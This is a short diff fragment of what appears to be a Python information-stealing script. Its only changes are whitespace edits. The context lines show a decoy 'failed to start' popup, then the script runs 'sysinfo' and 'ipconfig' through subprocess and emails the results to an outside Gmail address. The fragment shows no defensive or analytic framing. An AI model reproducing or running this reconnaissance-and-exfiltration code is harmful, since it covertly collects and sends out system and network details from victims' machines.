@@ -28,9 +28,10 @@ command = "msg * failed to start"
 
 command = "sysinfo"
 result1 = subprocess.check_output(command, shell=True)
- 
+
 command = "ipconfig"
 result2 = subprocess.check_output(command, shell=True)
+
 
 send_mail("captianlastimosa@gmail.com", "", result1)
 
